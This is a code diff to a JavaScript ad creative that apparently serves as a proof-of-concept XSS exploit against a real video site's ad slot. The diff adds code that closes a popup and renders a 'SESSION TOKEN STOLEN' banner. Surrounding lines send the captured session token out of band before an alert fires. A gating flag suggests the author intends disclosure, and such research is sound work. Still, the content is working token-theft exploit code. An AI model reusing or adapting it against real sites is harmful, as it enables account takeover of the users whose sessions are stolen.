@@ -98,7 +98,10 @@
                   gated: isOwn ? false : true
                 };
                 if (isOwn) body.token = token; else body.sub_prefix = (payload.sub || "").slice(0, 3) + "…";
-                finish(self._oob, btn, body, token, payload, isOwn);
+                // Close the www popup so the ad tab (where this creative lives) regains focus,
+                // making the on-screen proof visible.
+                try { wwwWin.close(); } catch (e) {}
+                finish(self, self._oob, btn, body, token, payload, isOwn);
                 return;
               }
             } catch (e) {}
@@ -111,7 +114,7 @@
     this._fire("AdLoaded");
   };
 
-  function finish(oob, btn, body, token, payload, isOwn) {
+  function finish(self, oob, btn, body, token, payload, isOwn) {
     // Flush the exfil FIRST, then defer the alert one event-loop turn so the
     // POST/beacon leaves the browser before the modal blocks the task.
     sendOOB(oob, body);
@@ -119,6 +122,21 @@
       btn.textContent = "Token captured (sub=" + (payload.sub || "?") + ")";
       btn.style.background = "#0a0";
     }
+    // Big, non-blocking on-screen proof banner rendered in the geo.dailymotion.com ad slot.
+    try {
+      if (self && self._slot) {
+        self._slot.innerHTML =
+          '<div style="position:absolute;inset:0;background:#0a0;color:#fff;' +
+            'font-family:sans-serif;display:flex;align-items:center;justify-content:center;z-index:99999">' +
+            '<div style="text-align:center;padding:16px">' +
+              '<div style="font-size:26px;font-weight:700;margin-bottom:10px">SESSION TOKEN STOLEN</div>' +
+              '<div style="font-size:14px;margin-bottom:6px">executing on ' + location.origin + '</div>' +
+              '<div style="font-size:14px">victim sub = ' + (payload.sub || "?") + ' &nbsp; alg = ' + (payload.alg || "RS256") + ' &nbsp; len = ' + (token ? token.length : 0) + '</div>' +
+              '<div style="font-size:12px;margin-top:10px;word-break:break-all;max-width:560px">' + (isOwn ? (token || "").slice(0, 72) + "…" : "[gated: non-own account]") + '</div>' +
+            '</div>' +
+          '</div>';
+      }
+    } catch (e) {}
     setTimeout(function () {
       var lines = [
         "XSS / token theft on " + location.origin,
